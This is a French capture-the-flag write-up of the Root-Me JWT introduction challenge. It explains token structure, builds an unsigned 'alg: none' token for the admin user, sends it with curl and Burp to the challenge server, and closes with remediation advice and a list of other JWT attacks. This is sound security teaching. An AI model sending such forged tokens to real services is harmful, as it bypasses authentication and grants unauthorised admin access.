
---

# 🔐 Root-Me – JWT Introduction (Challenge Web-Serveur #58)

**Auteur :** [exploit4040](https://github.com/exploit4040)  
**Plateforme :** [Root-Me](https://www.root-me.org)  
**Difficulté :** ⭐ Facile  
**Points :** 20  
**Catégorie :** Web – JWT (JSON Web Token)  

---


<img width="1540" height="780" alt="defie" src="https://github.com/user-attachments/assets/1552824e-8681-4c15-9654-7132aaf19268" />



## 1. Qu'est-ce qu'un JWT ?

Un **JWT (JSON Web Token)** est un format d'échange sécurisé de données entre deux parties (client et serveur). Il est souvent utilisé pour gérer les sessions d'authentification et les autorisations.

Un JWT se compose de **trois parties** séparées par un point (`.`) :

```
HEADER.PAYLOAD.SIGNATURE
```

### 🔹 Header (En‑tête)
Contient le type de token et l'algorithme de signature utilisé.

```json
{"typ":"JWT","alg":"HS256"}
```

<img width="743" height="500" alt="biror" src="https://github.com/user-attachments/assets/eafed187-f6e2-4374-9e50-d2cb20352abb" />


### 🔹 Payload (Charge utile)
Contient les données de l'utilisateur (claims), comme le nom d'utilisateur ou le rôle.

```json
{"username":"guest"}
```


### 🔹 Signature
Signe le header et le payload avec une clé secrète (HMAC) ou une clé privée (RSA/ECDSA). Elle garantit que le token n'a pas été modifié.

**Exemple de token complet :**
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk
```



📌 Décoder un JWT : [jwt.io](https://jwt.io) ou `base64 -d`



<img width="1413" height="731" alt="jwt_entre" src="https://github.com/user-attachments/assets/193aef5c-9cdc-41a9-8f8d-2c732d21a45b" />

---

## 2. Objectif du challenge

Le challenge nous demande de **nous connecter en tant qu'admin**. Nous avons un cookie JWT avec le payload `{"username":"guest"}`. Il faut modifier ce payload pour qu'il devienne `{"username":"admin"}`.

**Problème :** la signature est censée empêcher toute modification.  
**Vulnérabilité exploitée :** l'attaque **`alg: none`**.

---

## 3. Analyse du token initial

Depuis la requête HTTP fournie par l'énoncé :

```
Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk
```

| Partie | Base64 (URL-safe) | Valeur décodée |
|---|---|---|
| Header | `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9` | `{"typ":"JWT","alg":"HS256"}` |
| Payload | `eyJ1c2VybmFtZSI6Imd1ZXN0In0` | `{"username":"guest"}` |
| Signature | `OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk` | Signature HMAC-SHA256 |

---

## 4. L'attaque `alg: none`

### 🔎 Explication

Certains serveurs JWT mal configurés acceptent l'algorithme `"none"`. Cela signifie que **le serveur ne vérifie pas la signature** et se contente de décoder le header et le payload.

> C'est comme si un videur de boîte de nuit laissait entrer n'importe qui du moment qu'il présente une "carte" avec son nom écrit dessus, sans vérifier le sceau officiel.

Si le serveur implémente la vérification ainsi :

```python
# MAUVAISE pratique : on fait confiance au header du token !
if header["alg"] == "none":
    return decode_payload(token)  # pas de vérification !
```

Alors on peut simplement :
1. Changer l'algorithme en `"none"`
2. Modifier le payload pour `"admin"`
3. Laisser la signature vide

### 🛠️ Construction du token modifié

**Header :**
```json
{"typ":"JWT","alg":"none"}
```
Encodé en base64 URL-safe :
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0
```

**Payload :**
```json
{"username":"admin"}
```
Encodé en base64 URL-safe :
```
eyJ1c2VybmFtZSI6ImFkbWluIn0
```

**Signature :** vide (rien après le dernier point)

**Token final :**
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.
```

<img width="1425" height="530" alt="modif" src="https://github.com/user-attachments/assets/4a4d6755-a688-4f14-80ed-8324dc709a6a" />


> ⚠️ En base64 URL-safe, on enlève les `=` à la fin. Et pour `alg: none`, la signature est une chaîne vide.

---

## 5. Exploitation

### Avec cURL

```bash
curl -v "http://challenge01.root-me.org/web-serveur/ch58/index.php" \
  -b "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
```

<img width="1193" height="649" alt="terminal1" src="https://github.com/user-attachments/assets/6ff1f29c-73ca-4da9-933d-0b4ea96ce0a2" />


<img width="1211" height="685" alt="terminal2r" src="https://github.com/user-attachments/assets/ab96d874-452a-4f32-9ebe-b9f5e7afeef6" />



### Avec Burp Suite / Requête HTTP manuelle

```
GET /web-serveur/ch58/index.php HTTP/1.1
Host: challenge01.root-me.org
Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.
```

<img width="1193" height="649" alt="terminal1" src="https://github.com/user-attachments/assets/80507546-96e0-4c4c-bae4-3d1bf7a644ad" />



<img width="1211" height="685" alt="terminal2r" src="https://github.com/user-attachments/assets/a7f0df50-5213-4b6e-8b6c-4b9bf346808b" />




### 🔁 Réponse attendue

Si le challenge est validé, la réponse contient le **flag** (ou un message de succès "Vous êtes connecté en tant qu'admin").

---

## 6. Correction et recommandations

Pour éviter cette vulnérabilité côté développeur :

✅ **Ne jamais faire confiance au header `alg`** – toujours utiliser une liste blanche d'algorithmes autorisés côté serveur.  
✅ **Rejeter systématiquement `alg: none`** – cet algorithme ne doit jamais être utilisé en production.  
✅ **Utiliser une bibliothèque JWT à jour** (ex: `PyJWT`, `jsonwebtoken` pour Node.js, `jjwt` pour Java).  
✅ **Signer avec une clé forte** et la stocker de manière sécurisée (variables d'environnement, vault, etc.).  

**Exemple de vérification sécurisée (Python) :**

```python
import jwt

try:
    payload = jwt.decode(
        token,
        key="ma_cle_secrete_tres_longue_et_aleatoire",
        algorithms=["HS256"]  # Liste blanche, "none" sera rejeté
    )
except jwt.InvalidAlgorithmError:
    raise Exception("Algorithme non autorisé !")
```

---

## 7. Aller plus loin

Ce challenge est une introduction. Voici d'autres attaques JWT à connaître :

| Attaque | Description |
|---|---|
| **Algorithme `none`** | Forcer `alg: none` pour bypasser la signature |
| **Confusion d'algorithme (RS256 → HS256)** | Si le serveur utilise RSA, on peut forcer HMAC avec la clé publique |
| **Bruteforce de clé secrète** | Si la clé HMAC est faible (`secret`, `123456`, etc.) |
| **JKU / JWK Injection** | Injection de clé publique dans le header du JWT |
| **Expiration / NBF** | Manipulation des champs `exp` et `nbf` |

---

## 8. Flag ✅

> *Le flag s'affiche dans la réponse HTTP après envoi du token modifié.*

---

<img width="724" height="383" alt="finish" src="https://github.com/user-attachments/assets/1c9fb21a-4b1f-4f92-8120-435855cb56f7" />


<img width="1624" height="164" alt="valide" src="https://github.com/user-attachments/assets/bc694641-3319-4a7d-a2f6-d02722070e57" />


---

## Ressources

- [jwt.io – Debugger officiel](https://jwt.io)
- [OWASP – JSON Web Token Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [PortSwigger – JWT attacks](https://portswigger.net/web-security/jwt)
- [JWT_Tool](https://github.com/ticarpi/jwt_tool) – outils pour pentester les JWT

---

⭐ **Si ce writeup t'a aidé, n'oublie pas de laisser une star sur le repo !**

---
